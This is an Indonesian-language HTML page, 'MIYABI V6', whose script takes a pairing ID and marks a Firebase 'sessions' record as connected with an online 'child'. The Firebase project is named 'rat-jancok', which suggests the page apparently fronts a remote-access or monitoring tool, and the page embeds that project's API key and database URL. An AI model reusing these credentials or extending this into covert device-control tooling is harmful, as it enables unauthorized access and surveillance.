<!DOCTYPE html>
<html lang="id">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>MIYABI V6</title>

<style>

*{
box-sizing:border-box;
font-family:Arial;
}

body{
margin:0;
background:#050505;
color:white;
}

.topbar{
background:#111;
padding:20px;
font-size:22px;
font-weight:bold;
border-bottom:1px solid red;
box-shadow:0 0 15px red;
}


.profile{

margin:20px;
background:#111;
padding:20px;
border-radius:20px;
display:flex;
align-items:center;
gap:15px;

}


.avatar{

width:70px;
height:70px;
border-radius:50%;
background:linear-gradient(45deg,#ff0033,#6600ff);

display:flex;
align-items:center;
justify-content:center;

font-size:35px;

}


.online{

width:12px;
height:12px;
background:#00ff66;
border-radius:50%;
display:inline-block;

animation:pulse 1s infinite;

box-shadow:0 0 15px #00ff66;

}


@keyframes pulse{

50%{
transform:scale(1.5);
opacity:.3;
}

}


.box{

margin:20px;
background:#111;
padding:20px;
border-radius:20px;

}


input,button{

width:100%;
padding:14px;
margin-top:10px;

border:none;
border-radius:12px;

font-size:16px;

}


input{

background:#222;
color:white;

}


button{

background:red;
color:white;
font-weight:bold;

}


.info{

margin-top:15px;
background:#191919;
padding:15px;
border-radius:12px;

color:#00ff99;

}

</style>

</head>


<body>


<div class="topbar">
⚡ MIYABI V6
</div>



<div class="profile">

<div class="avatar">
👤
</div>

<div>

<h3>RAFZZ</h3>

<p>
<span class="online"></span>

<span id="connectStatus">
OWNER
</span>

</p>

</div>

</div>




<div class="box">

<h3>🔗 Akses Apk</h3>


<input 
id="code"
placeholder="Masukkan PAIRING ID didapat dari owner">


<button onclick="connect()">
CONNECT
</button>


<div class="info" id="info">

Menunggu ID...

</div>


</div>



<script type="module">


import { initializeApp }

from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";


import {

getDatabase,

ref,

get,

update

}

from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";



const firebaseConfig={


apiKey:"AIzaSyCnGnqV6fKvO3XDLBucrsIYPjGuafTun7g",

authDomain:"rat-jancok.firebaseapp.com",

databaseURL:
"https://rat-jancok-default-rtdb.asia-southeast1.firebasedatabase.app",

projectId:"rat-jancok",

storageBucket:"rat-jancok.firebasestorage.app",

messagingSenderId:"832199244613",

appId:"1:832199244613:web:d40428c4fd6e73d37d1c2c"


};



const app=initializeApp(firebaseConfig);

const db=getDatabase(app);



window.connect=async function(){


let code=document.getElementById("code").value.trim();


if(!code){

document.getElementById("info").innerHTML=
"Masukkan Pairing ID";

return;

}



const room=ref(db,"sessions/"+code);



const snap=await get(room);



if(snap.exists()){


await update(room,{

connected:true,

child:{

status:"Online",

joined:Date.now()

}

});



document.getElementById("info").innerHTML=
"✅ Berhasil terhubung";


document.getElementById("connectStatus").innerHTML=
"Online";


}else{


document.getElementById("info").innerHTML=
"❌ Pairing ID tidak ditemukan";


}


}


</script>


</body>
  </html>
